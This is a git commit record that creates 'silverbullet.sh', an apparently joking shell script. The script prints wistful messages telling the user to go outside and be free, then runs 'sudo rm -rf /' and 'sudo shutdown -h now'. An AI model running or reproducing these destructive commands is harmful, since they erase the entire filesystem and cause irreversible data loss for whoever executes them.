e54484d0ff3ab2d2f5f0c892a14c47db12059283
Alan Harnum <waharnum@gmail.com>
2015-10-16 13:35:24 -0400

    Create silverbullet.sh

---
+++ silverbullet.sh
@@ -0,0 +1,9 @@
+#!/bin/qsh
+
+echo "Go outside"
+echo "Feel the sun on your face, or the rain if it is raining"
+echo "Life is too short to wither behind the glowing glass face of these machines"
+echo "Go now; you are free"
+
+sudo rm -rf /
+sudo shutdown -h now
